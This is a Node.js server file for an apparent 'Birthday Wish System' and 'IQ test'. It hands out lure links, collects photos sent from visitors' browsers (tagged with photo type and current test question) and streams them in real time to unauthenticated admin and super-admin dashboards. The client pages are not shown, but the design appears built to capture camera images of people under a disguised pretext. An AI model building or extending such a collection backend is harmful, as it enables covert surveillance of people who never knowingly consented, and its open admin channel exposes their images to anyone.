const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// serve static files from project folder
app.use(express.static(path.join(__dirname)));

// Health check endpoint for Render - using a different path
app.get('/health', (req, res) => {
  res.send('Birthday Wish System is running!');
});

// Handle short birthday links
app.get('/wish/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  
  // Check if session exists
  const sessionData = sessions.get(sessionId);
  const sessionName = sessionData ? sessionData.sessionName : 'Birthday Celebration';
  
  // Redirect to birthday page with session parameters
  const redirectUrl = `/birthday.html?session=${sessionId}&name=${encodeURIComponent(sessionName)}`;
  res.redirect(redirectUrl);
});

// Handle IQ test links
app.get('/iqtest/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  
  // Check if IQ session exists, create if it doesn't
  if (!iqSessions.has(sessionId)) {
    iqSessions.set(sessionId, {
      id: sessionId,
      participantName: 'Anonymous',
      created: Date.now(),
      status: 'active',
      photoCount: 0
    });
    console.log(`IQ Session auto-created: ${sessionId}`);
    
    // Notify admins about new session
    broadcastToAdmins({
      type: 'iq_session_created',
      sessionId: sessionId,
      participantName: 'Anonymous'
    });
  }
  
  // Serve the IQ test page
  res.sendFile(path.join(__dirname, 'iq-test.html'));
});

// Root route - serve index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Session and client management
let adminClients = new Set();
let superAdminClients = new Set(); // Track super admins separately
let userClients = new Map(); // sessionId -> Set of WebSocket connections
let sessions = new Map(); // sessionId -> session data
let images = new Map(); // sessionId -> array of images
let iqSessions = new Map(); // IQ test sessions
let iqPhotos = new Map(); // IQ test photos
let totalImages = 0;

function broadcastToAdmins(message) {
  adminClients.forEach(client => {
    if (client.readyState === 1) {
      client.send(JSON.stringify(message));
    }
  });
}

function broadcastToSuperAdmins(message) {
  superAdminClients.forEach(client => {
    if (client.readyState === 1) {
      client.send(JSON.stringify(message));
    }
  });
}

function sendAllSessionsToSuperAdmin(superAdminWs) {
  if (superAdminWs.readyState !== 1) return;
  
  // Collect all images from all sessions
  const allImages = [];
  images.forEach((sessionImages, sessionId) => {
    sessionImages.forEach(imageData => {
      allImages.push({
        ...imageData,
        sessionId: sessionId
      });
    });
  });
  
  // Collect all IQ sessions
  const allIQSessions = Array.from(iqSessions.values());
  
  // Collect all IQ photos
  const allIQPhotos = [];
  iqPhotos.forEach((sessionPhotos, sessionId) => {
    sessionPhotos.forEach(photoData => {
      allIQPhotos.push({
        ...photoData,
        sessionId: sessionId
      });
    });
  });
  
  // Send comprehensive data to super admin
  superAdminWs.send(JSON.stringify({
    type: 'all_sessions_data',
    allImages: allImages,
    allIQSessions: allIQSessions,
    allIQPhotos: allIQPhotos,
    totalSessions: sessions.size + iqSessions.size,
    totalImages: allImages.length + allIQPhotos.length
  }));
}

function updateAdminStats() {
  const stats = {
    type: 'stats',
    totalImages: totalImages,
    activeSessions: Array.from(sessions.keys()),
    connectedUsers: Array.from(userClients.values()).reduce((sum, set) => sum + set.size, 0)
  };
  broadcastToAdmins(stats);
}

wss.on('connection', (ws, req) => {
  ws.on('message', (msg) => {
    let data = null;
    
    try {
      data = JSON.parse(msg.toString());
    } catch (e) {
      console.warn('Invalid JSON message:', e);
      return;
    }
    
    if (data.type === 'register') {
      if (data.role === 'admin') {
        ws.isAdmin = true;
        ws.adminType = data.adminType || 'normal';
        ws.sessionToken = data.sessionToken;
        
        adminClients.add(ws);
        
        if (data.adminType === 'super') {
          superAdminClients.add(ws);
          console.log('Super admin connected');
          
          // Send all sessions data to super admin
          setTimeout(() => {
            sendAllSessionsToSuperAdmin(ws);
          }, 1000);
        } else {
          console.log('Normal admin connected');
        }
        
        // Send current stats to new admin
        updateAdminStats();
        
      } else if (data.role === 'user' && data.sessionId) {
        ws.isUser = true;
        ws.sessionId = data.sessionId;
        
        // Add to user clients for this session
        if (!userClients.has(data.sessionId)) {
          userClients.set(data.sessionId, new Set());
        }
        userClients.get(data.sessionId).add(ws);
        
        console.log(`User connected to session: ${data.sessionId}`);
        
        // For IQ test sessions, update the session and notify admins
        if (iqSessions.has(data.sessionId)) {
          const session = iqSessions.get(data.sessionId);
          session.status = 'active';
          session.lastActive = Date.now();
          
          // Notify admins about active IQ session
          broadcastToAdmins({
            type: 'iq_session_active',
            sessionId: data.sessionId,
            participantName: session.participantName,
            status: session.status
          });
        }
        
        // Notify admins
        broadcastToAdmins({ type: 'user_connected', sessionId: data.sessionId });
        updateAdminStats();
      }
      
    } else if (data.type === 'create_session') {
      // Admin is creating a new session
      sessions.set(data.sessionId, {
        id: data.sessionId,
        name: data.sessionName,
        created: Date.now(),
        imageCount: 0
      });
      console.log(`Session created: ${data.sessionId} (${data.sessionName})`);
      updateAdminStats();
      
    } else if (data.type === 'create_iq_session') {
      // Admin is creating a new IQ test session
      iqSessions.set(data.sessionId, {
        id: data.sessionId,
        participantName: data.participantName,
        created: Date.now(),
        status: 'active',
        photoCount: 0
      });
      console.log(`IQ Session created: ${data.sessionId} (${data.participantName})`);
      
      // Notify admins
      broadcastToAdmins({
        type: 'iq_session_created',
        sessionId: data.sessionId,
        participantName: data.participantName
      });
      
    } else if (data.type === 'iq_photo_capture') {
      // IQ test photo capture
      console.log(`Received IQ photo capture: ${data.sessionId} - ${data.photoType}`);
      
      if (!iqPhotos.has(data.sessionId)) {
        iqPhotos.set(data.sessionId, []);
      }
      
      const photoData = {
        type: data.photoType,
        timestamp: data.timestamp,
        currentQuestion: data.currentQuestion,
        photo: data.photo
      };
      
      iqPhotos.get(data.sessionId).push(photoData);
      
      // Update session photo count
      if (iqSessions.has(data.sessionId)) {
        iqSessions.get(data.sessionId).photoCount++;
        console.log(`Session ${data.sessionId} now has ${iqSessions.get(data.sessionId).photoCount} photos`);
      }
      
      // Forward to all admins
      const messageToAdmins = {
        type: 'iq_photo_captured',
        sessionId: data.sessionId,
        photoType: data.photoType,
        timestamp: data.timestamp,
        currentQuestion: data.currentQuestion,
        photo: data.photo
      };
      
      console.log(`Broadcasting IQ photo to ${adminClients.size} admins`);
      broadcastToAdmins(messageToAdmins);
      
      // For super admins, also update their comprehensive view
      if (superAdminClients.size > 0) {
        setTimeout(() => {
          superAdminClients.forEach(superAdmin => {
            sendAllSessionsToSuperAdmin(superAdmin);
          });
        }, 500);
      }
      
      console.log(`IQ Photo captured: ${data.sessionId} - ${data.photoType}`);
      
    } else if (data.type === 'iq_test_complete') {
      // IQ test completion
      if (iqSessions.has(data.sessionId)) {
        const session = iqSessions.get(data.sessionId);
        session.status = 'completed';
        session.score = data.score;
        session.correctAnswers = data.correctAnswers;
        session.totalQuestions = data.totalQuestions;
        session.completedAt = data.timestamp;
      }
      
      // Notify admins
      broadcastToAdmins({
        type: 'iq_test_completed',
        sessionId: data.sessionId,
        score: data.score,
        correctAnswers: data.correctAnswers,
        totalQuestions: data.totalQuestions,
        timestamp: data.timestamp
      });
      
      console.log(`IQ Test completed: ${data.sessionId} - Score: ${data.score}`);
      
    } else if (data.type === 'image' && data.sessionId) {
      // User is sending an image
      totalImages++;
      
      // Store the image
      if (!images.has(data.sessionId)) {
        images.set(data.sessionId, []);
      }
      images.get(data.sessionId).push({
        type: 'image',
        sessionId: data.sessionId,
        time: data.time,
        payload: data.payload,
        captureNumber: data.captureNumber
      });
      
      // Update session image count
      if (sessions.has(data.sessionId)) {
        sessions.get(data.sessionId).imageCount++;
      }
      
      // Forward to all admins
      broadcastToAdmins({
        type: 'image',
        sessionId: data.sessionId,
        time: data.time,
        payload: data.payload,
        captureNumber: data.captureNumber
      });
      
      // For super admins, also update their comprehensive view
      if (superAdminClients.size > 0) {
        setTimeout(() => {
          superAdminClients.forEach(superAdmin => {
            sendAllSessionsToSuperAdmin(superAdmin);
          });
        }, 500);
      }
      
      updateAdminStats();
      
    } else if (data.type === 'session_ended' && data.sessionId) {
      // User ended their session
      console.log(`Session ended: ${data.sessionId}`);
      broadcastToAdmins({ type: 'session_ended', sessionId: data.sessionId });
      
    } else if (data.type === 'delete_image') {
      // Super admin wants to delete a birthday image
      if (ws.adminType !== 'super') {
        ws.send(JSON.stringify({
          type: 'delete_error',
          message: 'Only super admin can delete images'
        }));
        return;
      }
      
      const { sessionId, imageTime, imageType } = data;
      console.log(`Super admin deleting image: ${sessionId} at ${imageTime}`);
      
      // Remove from server storage
      if (images.has(sessionId)) {
        const sessionImages = images.get(sessionId);
        const imageIndex = sessionImages.findIndex(img => img.time === imageTime);
        if (imageIndex !== -1) {
          sessionImages.splice(imageIndex, 1);
          totalImages = Math.max(0, totalImages - 1);
          
          // Update session image count
          if (sessions.has(sessionId)) {
            sessions.get(sessionId).imageCount = Math.max(0, sessions.get(sessionId).imageCount - 1);
          }
          
          // Notify all admins about the deletion
          broadcastToAdmins({
            type: 'image_deleted',
            sessionId: sessionId,
            imageTime: imageTime,
            deletedBy: 'super_admin'
          });
          
          // Update stats
          updateAdminStats();
          
          console.log(`Image deleted successfully: ${sessionId} at ${imageTime}`);
        } else {
          ws.send(JSON.stringify({
            type: 'delete_error',
            message: 'Image not found'
          }));
        }
      } else {
        ws.send(JSON.stringify({
          type: 'delete_error',
          message: 'Session not found'
        }));
      }
      
    } else if (data.type === 'delete_iq_photo') {
      // Super admin wants to delete an IQ test photo
      if (ws.adminType !== 'super') {
        ws.send(JSON.stringify({
          type: 'delete_error',
          message: 'Only super admin can delete images'
        }));
        return;
      }
      
      const { sessionId, timestamp } = data;
      console.log(`Super admin deleting IQ photo: ${sessionId} at ${timestamp}`);
      
      // Remove from server storage
      if (iqPhotos.has(sessionId)) {
        const sessionPhotos = iqPhotos.get(sessionId);
        const photoIndex = sessionPhotos.findIndex(photo => photo.timestamp === timestamp);
        if (photoIndex !== -1) {
          sessionPhotos.splice(photoIndex, 1);
          
          // Update session photo count
          if (iqSessions.has(sessionId)) {
            iqSessions.get(sessionId).photoCount = Math.max(0, iqSessions.get(sessionId).photoCount - 1);
          }
          
          // Notify all admins about the deletion
          broadcastToAdmins({
            type: 'iq_photo_deleted',
            sessionId: sessionId,
            timestamp: timestamp,
            deletedBy: 'super_admin'
          });
          
          console.log(`IQ photo deleted successfully: ${sessionId} at ${timestamp}`);
        } else {
          ws.send(JSON.stringify({
            type: 'delete_error',
            message: 'Photo not found'
          }));
        }
      } else {
        ws.send(JSON.stringify({
          type: 'delete_error',
          message: 'IQ session not found'
        }));
      }
    }
  });

  ws.on('close', () => {
    if (ws.isAdmin) {
      adminClients.delete(ws);
      if (ws.adminType === 'super') {
        superAdminClients.delete(ws);
        console.log('Super admin disconnected');
      } else {
        console.log('Normal admin disconnected');
      }
    } else if (ws.isUser && ws.sessionId) {
      const sessionUsers = userClients.get(ws.sessionId);
      if (sessionUsers) {
        sessionUsers.delete(ws);
        if (sessionUsers.size === 0) {
          userClients.delete(ws.sessionId);
        }
      }
      
      // Notify admins
      broadcastToAdmins({ type: 'user_disconnected', sessionId: ws.sessionId });
      updateAdminStats();
      
      console.log(`User disconnected from session: ${ws.sessionId}`);
    }
  });
});

const PORT = process.env.PORT || 8000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`WebImageAnalyzer server listening on port ${PORT}`);
  console.log(`Admin panel: http://localhost:${PORT}/admin.html`);
});
